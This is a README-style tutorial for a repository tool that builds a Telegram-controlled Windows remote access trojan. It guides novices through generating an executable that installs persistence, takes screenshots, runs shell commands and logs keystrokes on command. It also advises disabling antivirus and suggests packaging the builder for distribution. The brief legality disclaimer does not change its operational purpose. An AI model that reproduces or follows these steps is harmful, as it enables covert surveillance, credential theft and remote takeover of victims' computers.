# 🛠️ How to Build Your Own RAT Client

This guide walks you through building a fully functional RAT client using the builder tool in this repository. No prior coding experience required.

---

## 1. What You'll Need

- A **Windows** computer (the generated client runs on Windows).
- **Python 3.11 or newer** installed.  
  → Download from [python.org](https://www.python.org/downloads/).  
  → During installation, **check** "Add Python to PATH".
- A **Telegram account** – you'll get a Bot Token and your Chat ID.
- Basic command-line skills (copy‑paste the commands below).

---

## 2. Get the Builder Code

### Option A – Clone with Git
```cmd
git clone https://github.com/dev-joshua-py/RAT-Builder.git
cd RAT-Builder
```

### Option B – Download ZIP
- Go to the repository page.
- Click **Code** → **Download ZIP**.
- Extract the ZIP and open a Command Prompt in that folder.

---

## 3. Install Dependencies

Open a Command Prompt **in the builder folder** and run:

```cmd
pip install -r requirements.txt
```

If you don't have `requirements.txt`, just install PyInstaller:
```cmd
pip install pyinstaller
```

---

## 4. Run the Builder GUI

```cmd
python builder.py
```

A window will pop up with fields for:

- **Bot Token** – your Telegram bot token.
- **Chat ID** – your numeric Telegram user ID.
- **Your User ID** – same as Chat ID.
- **Output Name** – what you want the final `.exe` to be called.

---

## 5. Get Your Telegram Credentials

### 5.1 Bot Token
- Open Telegram and search for **@BotFather**.
- Send `/newbot` and follow the prompts.
- After creation, BotFather gives you a token like:  
  `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`  
  Copy this token.

### 5.2 Chat ID (your user ID)
- Send any message to your new bot.
- Visit in your browser:  
  `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`  
  (replace `<YOUR_TOKEN>` with your actual token).
- Look for `"chat":{"id":123456789}` – that number is your Chat ID.

### 5.3 Your User ID
- Same number as Chat ID. Copy it (no quotes).

---

## 6. Fill in the Builder Fields

- **Bot Token**: paste the token you copied (e.g., `1234567890:ABCdef...`).
- **Chat ID**: paste your numeric ID (e.g., `123456789`).
- **Your User ID**: same as Chat ID (must be a number, e.g., `123456789`).
- **Output Name**: type a name, e.g., `MyRAT` (do not add `.exe` – it's added automatically).

---

## 7. Build the RAT

Click the **"Build RAT"** button.

- The builder will create a temporary Python script with your credentials.
- PyInstaller will compile it into a standalone `.exe`.
- After a few minutes, a **"Save As"** dialog will appear – choose where to save the `.exe`.

---

## 8. Test Your RAT Client

- Copy the generated `.exe` to a Windows test machine (use a VM if possible).
- Run it as **Administrator** (right‑click → Run as administrator).
- On the first run, it will install persistence and send `[RAT started]` to your Telegram.

Now you can send commands from Telegram:

|    Command    |         What it does        |
|---------------|-----------------------------|
| `/help`       | Show all commands           |
| `/screenshot` | Take and send a screenshot  |
| `/cmd whoami` | Run `whoami` command        |
| `/sysinfo`    | Show system information     |
| `/keys`       | Start keylogger             |
| `/keys_stop`  | Stop keylogger and get logs |

For the full command list, send `/help`.

---

## 9. Troubleshooting

### "Python not found" error
- Ensure Python is installed and added to PATH.  
  Re‑run the installer and check "Add Python to PATH".

### "PyInstaller not found"
- Install it manually: `pip install pyinstaller`.

### Build fails with errors
- Make sure you're in the correct folder and have write permissions.
- Temporarily disable your antivirus if it blocks PyInstaller (it sometimes triggers false positives).

### No `[RAT started]` in Telegram
- Double‑check your Bot Token and Chat ID.
- Ensure your bot is not blocked and you have internet.

---

## 10. Next Steps

- Optionally, compile the builder itself into an `.exe` (for easier distribution):  
  `pyinstaller --onefile --noconsole --name RAT_Builder builder.py`
- Share the builder or the generated client responsibly.
- Always respect the law – use only on systems you own or have explicit permission to test.

---

**That's it – you're now ready to build and test your own RAT client. Happy research!**
